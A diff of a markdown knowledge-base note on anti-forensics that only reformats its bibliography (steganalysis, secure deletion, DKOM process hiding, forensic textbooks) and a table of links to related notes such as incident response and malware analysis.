+1. Fridrich, J., Goljan, M., & Du, R. (2001). "Detecting LSB Steganography in Color, and Gray-Scale Images." *IEEE Multimedia*, 8(4), 22-28. — Foundational RS analysis.
 
-2. Fridrich, J., & Kodovský, J. (2012). "Rich Models for Steganalysis of Digital Images." _IEEE Transactions on Information Forensics and Security_, 7(3), 868-882. — Rich model steganalysis.
+2. Fridrich, J., & Kodovský, J. (2012). "Rich Models for Steganalysis of Digital Images." *IEEE Transactions on Information Forensics and Security*, 7(3), 868-882. — Rich model steganalysis.
 
-3. Holub, V., Fridrich, J., & Denemark, T. (2014). "Universal Distortion Function for Steganography in an Arbitrary Domain." _EURASIP Journal on Information Security_, 2014(1). — HILL distortion function.
+3. Holub, V., Fridrich, J., & Denemark, T. (2014). "Universal Distortion Function for Steganography in an Arbitrary Domain." *EURASIP Journal on Information Security*, 2014(1). — HILL distortion function.
 
-4. Westfeld, A., & Pfitzmann, A. (2000). "Attacks on Steganographic Systems." _LNCS 1768_, 61-76. — Chi-square attack.
+4. Westfeld, A., & Pfitzmann, A. (2000). "Attacks on Steganographic Systems." *LNCS 1768*, 61-76. — Chi-square attack.
 
-5. Gutmann, P. (1996). "Secure Deletion of Data from Magnetic and Solid-State Memory." _Proceedings of the 6th USENIX Security Symposium_. — 35-pass overwrite.
+5. Gutmann, P. (1996). "Secure Deletion of Data from Magnetic and Solid-State Memory." *Proceedings of the 6th USENIX Security Symposium*. — 35-pass overwrite.
 
-6. NIST. (2014). _SP 800-88 Rev. 1: Guidelines for Media Sanitization_. — Modern data destruction standards.
+6. NIST. (2014). *SP 800-88 Rev. 1: Guidelines for Media Sanitization*. — Modern data destruction standards.
 
-7. Russinovich, M. E., Solomon, D. A., & Ionescu, A. (2012). _Windows Internals, Part 1_ (6th ed.). Microsoft Press. — $MFT, EPROCESS, DKOM.
+7. Russinovich, M. E., Solomon, D. A., & Ionescu, A. (2012). *Windows Internals, Part 1* (6th ed.). Microsoft Press. — $MFT, EPROCESS, DKOM.
 
-8. Silberman, P., & Cihula, A. (2007). "Uninformed: DKOM (Direct Kernel Object Manipulation)." _Uninformed Journal_, 6. — Process hiding via DKOM.
+8. Silberman, P., & Cihula, A. (2007). "Uninformed: DKOM (Direct Kernel Object Manipulation)." *Uninformed Journal*, 6. — Process hiding via DKOM.
 
-9. Lehto, M. (2015). _Cyber Security: Analytics, Technology and Automation_. Springer. — Anti-forensics taxonomy.
+9. Lehto, M. (2015). *Cyber Security: Analytics, Technology and Automation*. Springer. — Anti-forensics taxonomy.
 
-10. Harris, S. (2014). _CISSP All-in-One Exam Guide_ (7th ed.). McGraw-Hill. — Anti-forensics and countermeasures overview.
+10. Harris, S. (2014). *CISSP All-in-One Exam Guide* (7th ed.). McGraw-Hill. — Anti-forensics and countermeasures overview.
 
-11. Casey, E. (2011). _Digital Evidence and Computer Crime_ (3rd ed.). Academic Press. — Forensic timeline reconstruction.
+11. Casey, E. (2011). *Digital Evidence and Computer Crime* (3rd ed.). Academic Press. — Forensic timeline reconstruction.
 
-12. Dorigo, M., & Stützle, T. (2004). _Ant Colony Optimization_. MIT Press. — Referenced untuk framework optimasi (cross-domain).
+12. Dorigo, M., & Stützle, T. (2004). *Ant Colony Optimization*. MIT Press. — Referenced untuk framework optimasi (cross-domain).
 
 ## Koneksi ke Vault
 
-| Catatan                                           | Koneksi                                                                                                  |
-| :------------------------------------------------ | :------------------------------------------------------------------------------------------------------- |
-| [[meta-agent-orchestration]]                      | ACO routing untuk agent dispatch — anti-forensics bisa digunakan untuk menghilangkan jejak orchestration |
-| [[endpoint-security]]                             | Ring -3 sampai Ring 3 — anti-forensics beroperasi di semua ring                                          |
-| [[malware-analysis-reverse-engineering-playbook]] | Inversi langsung: bagaimana malware menghindari analisis                                                 |
-| [[hardware-hacking-re]]                           | Physical destruction overlap dengan hardware hacking reverse                                             |
-| [[cryptography-biometrics]]                       | Steganografi dan plausible deniability adalah aplikasi kriptografi                                       |
-| [[incident-response-framework]]                   | IR harus aware akan teknik anti-forensics ini untuk tidak miss evidence                                  |
+| Catatan | Koneksi |
+|:--------|:--------|
+| [[meta-agent-orchestration]] | ACO routing untuk agent dispatch — anti-forensics bisa digunakan untuk menghilangkan jejak orchestration |
+| [[endpoint-security]] | Ring -3 sampai Ring 3 — anti-forensics beroperasi di semua ring |
+| [[malware-analysis-reverse-engineering-playbook]] | Inversi langsung: bagaimana malware menghindari analisis |
+| [[hardware-hacking-re]] | Physical destruction overlap dengan hardware hacking reverse |
+| [[cryptography-biometrics]] | Steganografi dan plausible deniability adalah aplikasi kriptografi |
+| [[incident-response-framework]] | IR harus aware akan teknik anti-forensics ini untuk tidak miss evidence |
